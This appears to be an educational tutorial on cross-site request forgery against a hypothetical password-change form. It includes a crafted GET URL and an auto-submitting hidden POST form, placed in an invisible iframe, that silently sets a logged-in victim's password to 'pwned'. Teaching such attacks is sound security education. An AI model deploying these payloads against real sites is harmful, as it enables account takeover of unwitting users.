# Cross site requesting forgery
## What is this
Cross site requesting forgery is a vulnerability that a website might expose and the point of it is simple to understand  
Let's see a simple example, let's suppose that there is a website where you can, once authentificated using a session, change your password using a form :
```
www.website.com/settings/account.php
```
```
Website

Account name : h4xoor
Password : ********
[CHANGE PASSWORD]
```
By clicking change password you are for example redirected to another page :
```
www.website.com/settings/change_password.php
```
```
New password : [ENTER NEW PASSWORD HERE]
[CHANGE]
```
Well you can enter a new password then click on the `[CHANGE]` button to submit changes, let's say that we have this input :
```
New password : [EpicPass2000]
[CHANGE]
```
That's cool, your password has been changed, now let's analyse the webpage code, and specificly the form assigned to the password changing action :
```html
<form  name="change_password_form" action="change_password.php" method="GET">
  <p>New password : <input type="text" name="new_password"></p>
  <input type="submit" name="change_password_submit" value="Change">
</form>
```
As you can see, the method which is used to send the information is `GET`, so it's passed in the URL, well it's the same concept is `POST` but the exploitation would be different, so since it's `GET` the request variables are sent by the URL and, without any surprise, there's how the URL look like when we click on this submit button :
```
www.website.com/settings/change_password.php?new_password=EpicPass2000&change_paassword_submit=Change
```
So as you can see below, variables involved in the action are :
```
new_password = EpicPass2000
change_paassword_submit=Change
```
That's cool, so the password which will replace the old one is defined by `new_password` and the button is `change_paassword_submit` (`=Change`)  
So then what's the point of this analyse ? You will understand in a bit  
Now in the URL, let's change the password again, using only the URL which is generated by the form  
We will set the password to `pwned` :
```
www.website.com/settings/change_password.php?new_password=pwned&change_paassword_submit=Change
```
So now the password has been alterned to `pwned`, as well expected  
## CSRF - GET
Now that's cool but what's the problem ? Well it's not so hard to guess, with only a simple URL, you can change the account password, using only this link, assuming of course that the person client is connected to his account session  
So then what if we send the url to someone else ? It's somewhat a weird idea but let's try  
So `BrownDownTheSkid` is the account of the target :
```
Website

Account name : BrownDownTheSkid
Password : ********
[CHANGE PASSWORD]
```
Now by any context, the target can access this url we made (`www.website.com/settings/change_password.php?new_password=pwned&change_paassword_submit=Change`) and changing his password, so when he access it...  
His password got changed to `pwned`  
And that's the whole stuff about this attack
## CSRF - POST
Now let's assume that the form that we've seem earlier is working in `POST` :
```html
<form name="change_password_form" action="change_password.php" method="POST">
  <p>New password : <input type="text" name="new_password"></p>
  <input type="submit" name="change_password_submit" value="Change">
</form>
```
The variables aren't passed in the URL but in the request, somewhere deep so we can't control these variables using a URL, so then how can we do ? Is there really no solution ? Of course there is ! Well it's simply to use the way your browser is sending data over `POST`, how can we do that ? Well it's hard to guess but we can play with the `action` parameter of a form  
So, remember, the form was like :
```html
<form name="change_password_form" action="change_password.php" method="POST">
  <p>New password : <input type="text" name="new_password"></p>
  <input type="submit" name="change_password_submit" value="Change">
</form>
```
As you can see, the code is from the website page and the form sends the whole data to `change_password.php` which is here the same page, so we can imagine some php code handling it if the data is set, now imagine the target accessing to OUR website with this form, we can try, so we copy the same code to our website, well the form visualy works but there's no `change_password.php` in our server or there's no code to handle it, it's because we're no longer in the target website but in ours, but remember, the `action` parameter defines the target website where the data is sent over `POST` or `GET`, so then since it's the same form, with the same variables (`new_password`...), what if we try to redirect the data to the target website ? :
```html
<form name="change_password_form" action="www.website.com/settings/change_password.php" method="POST">
  <p>New password : <input type="text" name="new_password"></p>
  <input type="submit" name="change_password_submit" value="Change">
</form>
```
Now if we try in our website, we can enter values in our form and now the data is sent to the target website, with the content we've specified  
So now it means we control data we send ! Now we can also specify values that we want to send :
```html
<form name="change_password_form" action="www.website.com/settings/change_password.php" method="POST">
  <p>New password : <input type="text" name="new_password" value="pwned" ></p>
  <input type="submit" name="change_password_submit" value="Change">
</form>
```

So i've set the passsword we want to set to `pwned`, if we try now the data is set, we just have to click on submit to submit the form, but our goal is to do it automatically, so we can change things a bit :
```js
<form id="form_target" name="change_password_form" action="www.website.com/settings/change_password.php" method="POST">
  <p>New password : <input type="text" name="new_password" value="pwned" ></p>
  <input type="submit" name="change_password_submit" value="Change">
</form>
<script>document.getElementById("form_target").submit()</script>
```
You can imagine what it does, so i've set an id for the form (`form_target`) and used JS to submit it without user interaction, so we could now send it to target, but first let's just hide things to send the request secretely :
```js
<iframe style="display:none" name="hidden_frame">
<form id="form_target" target="hidden_frame" name="change_password_form" action="www.website.com/settings/change_password.php" method="POST">
  <input type="hidden" name="new_password" value="pwned">
  <input type="submit" name="change_password_submit" value="Change">
</form>
</iframe>
<script>document.getElementById("form_target").submit()</script>
```
As you can see i've set the type of the input to `hidden` so it doesn't show and i put this in an iframe which has display to none so the whole form in it doesn't show, now if this code is executed by any user (who has an account session in the target website), he's password will be changed to `pwned`, so since it's on our website, if he access it, it will work just like the other `GET` attack 
